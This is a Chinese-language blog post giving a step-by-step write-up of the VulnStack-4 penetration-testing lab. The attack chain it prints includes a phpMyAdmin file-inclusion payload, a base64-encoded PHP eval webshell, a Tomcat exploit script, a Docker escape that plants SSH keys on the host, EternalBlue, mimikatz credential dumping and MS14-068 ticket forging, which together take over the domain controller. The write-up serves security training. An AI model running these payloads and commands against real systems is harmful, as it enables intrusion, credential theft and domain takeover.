<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="记一次靶场练习-VulnStack-4这里先给出拓扑图（图是网上贴的，我这边HOST1的IP是192.168.111.138）  配置环境在这里就不记录了，直接从开打写起。 信息收集由于默认已经知道了HOST1的ip，但直接访问ip显示404，所以这里我们用nmap扫一下。 1nmap -T4 -sC -sV 192.168.111.138  结果如图：  在这里我们能够看见它的2002端口的to">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-VulnStack-4/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="记一次靶场练习-VulnStack-4这里先给出拓扑图（图是网上贴的，我这边HOST1的IP是192.168.111.138）  配置环境在这里就不记录了，直接从开打写起。 信息收集由于默认已经知道了HOST1的ip，但直接访问ip显示404，所以这里我们用nmap扫一下。 1nmap -T4 -sC -sV 192.168.111.138  结果如图：  在这里我们能够看见它的2002端口的to">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020111111304336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMDA3MDQz,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220405221129.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220403163321.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220403164423.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220404152030.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220403181608.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220404152221.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220404153336.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220404163426.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220404175951.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220404180623.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220404190041.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220404210514.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220406173846.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220406173905.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220406174408.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220406174343.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220406174008.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220406175504.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220406175647.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220406175716.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220406174631.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220406174733.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220406174924.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220405203528.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220405203517.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220405203621.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220405212008.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220405212020.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220405211654.png">
<meta property="og:image" content="http://example.com/Users/shihiroshisakai/Downloads/20220405211737.png">
<meta property="article:published_time" content="2022-04-08T03:22:40.256Z">
<meta property="article:modified_time" content="2022-04-08T02:56:19.000Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/2020111111304336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMDA3MDQz,size_16,color_FFFFFF,t_70#pic_center">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.1.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-记一次靶场练习-VulnStack-4" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-VulnStack-4/" class="article-date">
  <time class="dt-published" datetime="2022-04-08T03:22:40.256Z" itemprop="datePublished">2022-04-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="记一次靶场练习-VulnStack-4"><a href="#记一次靶场练习-VulnStack-4" class="headerlink" title="记一次靶场练习-VulnStack-4"></a>记一次靶场练习-VulnStack-4</h1><p>这里先给出拓扑图（图是网上贴的，我这边HOST1的IP是192.168.111.138）</p>
<p><img src="https://img-blog.csdnimg.cn/2020111111304336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMDA3MDQz,size_16,color_FFFFFF,t_70#pic_center" alt="img"></p>
<p>配置环境在这里就不记录了，直接从开打写起。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>由于默认已经知道了HOST1的ip，但直接访问ip显示404，所以这里我们用nmap扫一下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV 192.168.111.138</span><br></pre></td></tr></table></figure>

<p>结果如图：</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220405221129.png" alt="20220405221129"></p>
<p>在这里我们能够看见它的2002端口的tomcat以及2003端口的phpMyAdmin及其相应的版本。</p>
<h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><h3 id="phpMyAdmin文件包含漏洞"><a href="#phpMyAdmin文件包含漏洞" class="headerlink" title="phpMyAdmin文件包含漏洞"></a>phpMyAdmin文件包含漏洞</h3><p>看到4.8.1的phpMyAdmin我们自然就能想到它的文件包含漏洞，这里我们测试一下该漏洞是否存在：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://http://192.168.0.105:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220403163321.png" alt="20220403163321"></p>
<p>这里我们可以看到漏洞的确存在。那么我们就要想办法包含恶意文件拿shell了，我这里先想到的是使用包含日志的方式。在SQL处执行如下语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p>并在f12中查看sessionid，我们最后要访问的路径为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_sessionid</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220403164423.png" alt="20220403164423"></p>
<p>这里我们看到的确是成功访问到含有我们写入的phpinfo的session文件的。接下来就可以写shell了，但不知道为啥，我这里写shell总是不成功。于是这里我换了个方法（和网上的大佬学的。。）。虽然session文件中没让我拿到shell，但phpinfo的出现说明session文件的确是可以解析PHP代码的，那我就直接利用session文件创建一个shell文件。执行sql语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT ‘&lt;?php file_put_contents(&quot;extrader.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4=&quot;));?&gt;’</span><br></pre></td></tr></table></figure>

<p>写入后我们再一次访问session文件（访问后才能执行我们刚刚写入的创建shell文件的命令）</p>
<p>然后蚁剑成功连接</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220404152030.png" alt="20220404152030"></p>
<p>由于之前开环境的时候已经知道了这个phpMyAdmin是跑在docker容器中的，所以这里作为攻击者，我们要当作什么也不知道，然后去检测一下是否在容器中，一般有两种方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">检查/.dockerenv文件是否存在</span><br><span class="line">检查/proc/1/cgroup内是否包含&quot;docker&quot;等字符串。</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220403181608.png" alt="20220403181608"></p>
<p>这里的dockerenv文件的确存在，说明确实是跑在docker容器中的。</p>
<p>按道理这个时候我们就已经可以准备想办法docker逃逸了，但是刚才在扫描的时候我们还扫到了一个tomcat，所以这里我们看一下tomcat这边有没有什么可以拿shell的地方。</p>
<h3 id="Tomcat任意文件上传漏洞"><a href="#Tomcat任意文件上传漏洞" class="headerlink" title="Tomcat任意文件上传漏洞"></a>Tomcat任意文件上传漏洞</h3><p>我们知道Tomcat的漏洞比较出名的有CVE-2017-12615，CVE-2017-12615是Tomcat中间件的任意文件上传漏洞，但此漏洞影响范围是Apache Tomcat 7.0.0 – 7.0.79，我们靶机的Tomcat版本似乎不再影响范围之内，是实际中Tomcat 5-9均存在类似CVE-2017-12615的利用方式，同样可以类比运用，但这不归属于CVE-2017-12615漏洞。</p>
<p>这里我们直接用kali自带的searchsploit来查找Tomcat的8.5.19版本的利用脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit tomcat 8.5.19   // 查找tomcat 8.5.19的利用脚本</span><br><span class="line">searchsploit -m /exploit/jsp/webapps/42966.py   //将利用脚本复制到当前的工作目录（-m参数）</span><br></pre></td></tr></table></figure>

<p>![image-20220405230141346](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220405230141346.png)</p>
<p>这里给出了我们可以使用42966.py脚本，我们用该脚本检测一下漏洞是否存在：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.0.105:2002/</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220404152221.png" alt="20220404152221"></p>
<p>看样子漏洞的确是存在的，接下来就可以进行攻击了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.0.105:2002/ -p pwn</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220404153336.png" alt="20220404153336"></p>
<p>这样就成功弹回一个shell了（不过说实话这个shell真丑。。。）</p>
<h2 id="Docker主机逃逸"><a href="#Docker主机逃逸" class="headerlink" title="Docker主机逃逸"></a>Docker主机逃逸</h2><p>同样的，用脚本跑出的这个shell也是在docker中的，我们要想办法从docker中逃逸，拿到主机shell。</p>
<h3 id="利用–privileged特权模式逃逸"><a href="#利用–privileged特权模式逃逸" class="headerlink" title="利用–privileged特权模式逃逸"></a>利用–privileged特权模式逃逸</h3><p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。</p>
<p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</p>
<p>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
<p>在之前扫描时我们看到了目标主机的22端口是开着的，也就是说如果，我们能够向主机中写入任意文件，我们就可以通过写ssh密钥的方式实现ssh免密登陆。</p>
<p>说干就干，我们先在根目录下创建一个用于挂载主机的目录hack，并用mount命令将外部宿主机磁盘设备挂载到hack下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /hack</span><br></pre></td></tr></table></figure>

<p>![image-20220405231951613](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220405231951613.png)</p>
<p>挂载成功了，此时我们就可以通过访问容器内部的&#x2F;hack路径来达到访问整个宿主机的目的。</p>
<p>我们看一下home中的ubuntu用户目录：</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220404163426.png" alt="20220404163426"></p>
<p>发现这里有.ssh目录，那么我们就可以往该文件夹内写密钥了。</p>
<p>先在攻击机本地生成密钥：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f hack</span><br><span class="line">chmod 600 hack    // 赋予执行权限</span><br></pre></td></tr></table></figure>

<p>由于我用echo无论如何也写不进文件，所以这里我直接在服务器上开了个http服务器，然后在容器中下载hack.pub文件，最后执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp hack.pub /hack/home/ubuntu/.ssh/authorized_keys </span><br></pre></td></tr></table></figure>

<p>随后ssh连接就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i hack ubuntu@192.168.0.105</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220404175951.png" alt="20220404175951"></p>
<p>连接成功，这里我们用msf生成木马并上传到ubuntu中，并在本地开启监听，然后在ubuntu中运行木马文件。</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220404180623.png" alt="20220404180623"></p>
<p>这样msf就已经上线了。</p>
<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="WIN7"><a href="#WIN7" class="headerlink" title="WIN7"></a>WIN7</h3><p>剩下就开始挂代理打了，我们发现它有两张网卡，所以直接扫描内网网卡主机存活：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220404190041.png" alt="20220404190041"></p>
<p>这里我们扫到了两台机子，分别是192.168.183.129和192.168.246.130。通过端口扫描又知道他们都开了445端口（这里忘截图了）</p>
<p>那我们就本能地想到永恒之蓝漏洞了，经过扫描发现这里的两台主机都可能存在永恒之蓝漏洞（这里又忘截图了。。。）</p>
<p>既然扫到了，那直接打就行了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.183.129</span><br><span class="line">set lport 4444</span><br><span class="line">set AutoRunScript post/windows/manage/migrate             // 自动迁移进程</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>这里总是在最后一步失败，一开始不知道为啥，到网上一看发现网上的大佬们并不是用的msf自带的代理，于是抱着试一试的心态我换ew重新试了一遍</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220404210514.png" alt="20220404210514"></p>
<p>它居然就行了。。。不过ew的连接特别容易断，于是这里从网上大佬们那发现了一个go写的代理工具chisel，十分稳定和强大，项目地址：<a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a> 。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 2336 --socks5    //向跳板机上面上传./chisel文件并打开服务端</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220406173846.png" alt="20220406173846"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 192.168.111.139:2333 socks  //攻击机上执行</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220406173905.png" alt="20220406173905"></p>
<p>这样拿到的连接就十分稳定了。</p>
<h3 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h3><p>剩下就开始进攻域控了，看一下当前权限</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220406174408.png" alt="20220406174408"></p>
<p>system，非常nice，那么我们就可以直接mimikatz抓取明文密码了。</p>
<p>抓取命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug   //提取权限</span><br><span class="line">sekurlsa::logonpasswords   //抓取密码</span><br></pre></td></tr></table></figure>

<p>就在这个时候，意外发生了</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220406174343.png" alt="20220406174343"></p>
<p>好家伙一个权限问题给我整不会了，我们不是已经是system权限了吗？那就先放开这条路，去看看有没有高权限的令牌可用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens-u    //列出可用的token</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220406174008.png" alt="20220406174008"></p>
<p>那就先抓个域用户douser的令牌吧，毕竟只有它有权限查看域内信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito_token “DEMO \douser”  //抓取DEMO域中的域用户douser</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220406175504.png" alt="20220406175504"></p>
<p>收集一波域内信息：</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220406175647.png" alt="20220406175647"></p>
<p><img src="/Users/shihiroshisakai/Downloads/20220406175716.png" alt="20220406175716"></p>
<p>除了上述信息外，还查了一下域管，发现只有Administrator（这里忘截图了。。。），一般来说普通域用户是登录不了域控的，所以用dosuer远控域控是不太可能了。原本我都打算搬出kerberost了，但因为实在是不想爆破（这里之前看过了，并没有可以直接拿来传递的高权限票据，所以kerberost攻击只能去爆破了。。。），于是没骨气的我偷看了一下网上大佬们的wp。然后就看到了一件我很不能接受的事情，网上的大佬们抓了个本地system的令牌，然后mimikatz就提权成功了。看得我一脸懵，我们本来不就是system权限吗？虽然不知道为啥，但抱着好奇心我还是试了一下：</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220406174631.png" alt="20220406174631"></p>
<p>虽然成功了，但也彻底给我整不会了。。。</p>
<p>这个问题之后探究，先接着往下打，mimikatz抓取明文密码。</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220406174733.png" alt="20220406174733"></p>
<p>这里抓到了douser这个域用户的密码，想想只有个普通域用户的明文密码能怎样打到域控。。。MS-14068！</p>
<p>我们先把MS-14068.exe传到域控上，注意不要传到它默认的Windows&#x2F;System32下，否则的话会执行失败。如下图</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220406174924.png" alt="20220406174924"></p>
<p>然后接下来我们直接用MS-14068制作高权限票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u 域用户@域名 -s 该与用户的sid -d 域控ip或名称 -p 该与用户的密码</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220405203528.png" alt="20220405203528"></p>
<p>如上图，成功生成票据。接下来我们用mimikatz注入内存就好</p>
<p>Kerberos:: ptc ‘之前生成的票据名’</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220405203517.png" alt="20220405203517"></p>
<p>大功告成啦。我们看一下能不能远程访问到域控</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220405203621.png" alt="20220405203621"></p>
<p>可以，那剩下的就简单了，先用copy命令向域控传一个正向马，msf挂代理监听，最后sc创建服务执行这个正向马。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\域控名 create shell binpath= &quot;c:\icesoul.exe&quot;    //创建一个服务</span><br><span class="line">sc \\域控名 start shell   //执行这个服务</span><br></pre></td></tr></table></figure>

<p><img src="/Users/shihiroshisakai/Downloads/20220405212008.png" alt="20220405212008"></p>
<p><img src="/Users/shihiroshisakai/Downloads/20220405212020.png" alt="20220405212020"></p>
<p>这里虽说报了1053的错，但实际上已经执行成功了。</p>
<p>域控上线：</p>
<p><img src="/Users/shihiroshisakai/Downloads/20220405211654.png" alt="20220405211654"></p>
<p><img src="/Users/shihiroshisakai/Downloads/20220405211737.png" alt="20220405211737"></p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/244704.html">https://www.freebuf.com/articles/network/244704.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-VulnStack-4/" data-id="cl1pvcyip00015gu8bndagxe6" data-title="" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2022/04/07/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Hello World</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-VulnStack-4/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/04/07/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>